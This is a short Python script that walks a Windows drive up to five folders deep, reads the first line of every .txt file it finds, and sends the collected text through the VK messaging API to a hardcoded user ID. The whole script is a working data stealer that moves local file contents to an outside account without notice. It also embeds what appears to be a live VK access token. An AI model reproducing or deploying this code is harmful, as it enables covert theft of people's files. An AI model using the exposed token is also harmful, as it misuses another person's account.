import os, sys, vk_api

def prnt(message):
    token = "vk1.a.KTuJ48WftO3R1KcFmdSpo-ZmOgavy1-Z5Xq4UeF8A0I0yPbDYK6Fvi_ws54NzAQP0crWOexVOvDkJJmEzFG0ZoG2yvbE2IvnB3SmlhSyuP_wZMtFq3EqUZmNAHfom1z7IhPG9Tl7GVYKbPyNjPGkAUqDHsKBTmQdU3sXJmT9EEJHqx0NR4_ArvHczBm-Y33Pc4G_hL7DIGu7i1oeBCLwtQ"
    id_bratik = 505285789

    session = vk_api.VkApi(token=token)
    vk = session.get_api()
    vk.messages.send(user_id=id_bratik, message=message, random_id=0)


def ff(patch, n):
    if n < 5:
        global ss
        for i in os.listdir(patch):
            if '.' in i:
                if i.split('.')[-1] == 'txt':
                    f = open(patch + f"\\{i}")
                    l = f.readline()
                    ss += l
                    f.close()

            else:
                try:
                    ff(patch + "\\" + i, n + 1)
                except BaseException:
                    pass





def f():
    global ss
    s = sys.exec_prefix
    ss = s
    ff(s.split('\\')[0] + '\\', 0)
    prnt(ss[:4096])